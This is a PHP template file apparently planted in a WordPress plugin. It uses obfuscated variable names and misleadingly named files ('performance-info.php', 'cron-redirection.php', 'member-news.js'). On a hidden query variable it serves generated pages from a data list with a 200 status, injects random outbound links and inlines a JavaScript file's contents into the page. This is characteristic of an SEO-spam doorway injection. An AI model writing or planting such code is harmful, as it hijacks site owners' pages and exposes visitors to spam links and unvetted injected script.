<?php
$gaVgk5 = intval(get_query_var('obdxwek'));

if ($gaVgk5 < 1 || $gaVgk5 > 4754) return;
$r8vdM = file(plugin_dir_path(__FILE__).'performance-info.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$luLHTV = explode(';', $r8vdM[$gaVgk5]);
if (count($luLHTV) < 2) return;
$inezN = $luLHTV[0];
$rxndjAe  = $luLHTV[1];
$r277aSa = $luLHTV[2];
$dZ4kM7PI  = $luLHTV[3];
$bW4yTo = $luLHTV[4];
set_query_var('gxfjmtqf', $inezN);

$aPqYOalq = '';
$wiFRQyhY = plugin_dir_path(__FILE__).'cron-redirection.php';
if (is_file($wiFRQyhY)) {
	$g21MeDsP2C = file($wiFRQyhY, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($g21MeDsP2C);
	shuffle($g21MeDsP2C);
	$y6xzbge = mt_rand(2, 5);
	if (count($g21MeDsP2C) > $y6xzbge) {
		for ($nXAQu2OSDB = 0; $nXAQu2OSDB < $y6xzbge; $nXAQu2OSDB++) {
			$lcAEr = array_shift($g21MeDsP2C);
			$aPqYOalq .= '<p><a href="'.$lcAEr.'">'.$lcAEr.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $inezN; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $rxndjAe . "</p>\n";
				if (strlen($dZ4kM7PI) > 0) echo "<p>" . $dZ4kM7PI . "</p>\n";
				if (strlen($r277aSa) > 0) echo "<p>" . $r277aSa . "</p>\n";
				if (strlen($bW4yTo) > 0) echo '<p><a href="#"><img src="'.$bW4yTo.'"></a>' . "</p>\n";
				echo $aPqYOalq;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$sdnxB = plugin_dir_path(__FILE__) . 'member-news.js';
if (is_file($sdnxB)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($sdnxB);
	echo '</script>';
}
get_footer();
?>
